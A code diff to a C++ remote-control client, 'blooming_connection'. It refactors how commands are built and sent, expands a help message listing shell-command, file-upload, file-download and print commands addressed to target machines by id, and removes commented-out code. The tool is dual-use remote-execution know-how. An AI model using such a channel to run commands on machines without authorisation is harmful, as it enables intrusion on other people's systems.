@@ -95,7 +95,7 @@ class blooming_connection
         send(sock, head.c_str(), strlen(head.c_str()), 0);
     }
 
-    string blooming_command_formator()
+    void blooming_command_formator()
     {
         string user_input_buffer;
         char command_type;
@@ -145,8 +145,12 @@ class blooming_connection
         {
         case 'h':
         {
-            printf("help:\n syntax\t<command type> <target id> <command content>...\n");
-            printf("example:\nprint test_machine hello world\n");
+
+            printf("help:\nsyntax\t<command type> <target id> <command content>...\n"
+                   "command types: e f d p h\n"
+                   "target id: target machine's id\n"
+                   "command content: e:\'shell commmand\' f:\'local file path\' d:\'remote file path\' p:\'text\' h: NONE\n"
+                   "example:\np test_machine hello world\n");
             break;
         }
         case 'e':
@@ -177,40 +181,11 @@ class blooming_connection
             break;
         }
         }
-
-        // if (command_type == 'h')
-        // {
-        //     printf("help:\n syntax\t<command type> <target id> <command content>...\n");
-        //     printf("example:\nprint test_machine hello world\n");
-        // }
-
-        // if (command_type == 'e')
-        // {
-        //     command_type_identifer = "e";
-        // }
-
-        // if (command_type == 'f')
-        // {
-        //     fstream file;
-        //     file.open(command_content);
-        //     if (file.is_open())
-        //     {
-        //         file.close();
-        //         command_type_identifer = "f";
-        //     }
-        //     else
-        //     {
-        //         file.close();
-        //     }
-        // }
-
-        // if (command_type == 'd')
-        // {
-        //     command_type_identifer = "d";
-        // }
-
-        result = "bloom-in " + command_type_identifer + " <channel>" + channel + "<channel><id>" + local_id + "<id>" + "<target>" + command_target + "<target>" + "<data>" + b64_en((char *)command_content.c_str()) + "<data>BLOOM_IN";
-        return result;
+        if (command_type != 'h')
+        {
+            result = "bloom-in " + command_type_identifer + " <channel>" + channel + "<channel><id>" + local_id + "<id>" + "<target>" + command_target + "<target>" + "<data>" + b64_en((char *)command_content.c_str()) + "<data>BLOOM_IN";
+            send(sock, result.c_str(), strlen(result.c_str()), 0);
+        }
     }
 
     void blooming_command_analysiser(string recv_buffer)
@@ -257,8 +232,7 @@ class blooming_connection
         string command;
         while (true)
         {
-            string data = blooming_command_formator();
-            send(sock, data.c_str(), strlen(data.c_str()), 0);
+            blooming_command_formator();
         }
     }
 
@@ -275,7 +249,6 @@ class blooming_connection
                 {
                     printf("%s %d %s", "close by remote server: ", (0 == strcmp(recv_buffer, "close")), "\n");
                     cout << "close by local exit command: " << (0 == sock_statu) << endl;
-                    // cout << "close because of something went wrong with connection: " << (NULL != strstr(recv_buffer, local_id.c_str())) << endl;
                     if (0 == sock_statu)
                     {
                         cout << "close because the server didn't response for some reasons or currently under attack: 0" << endl;
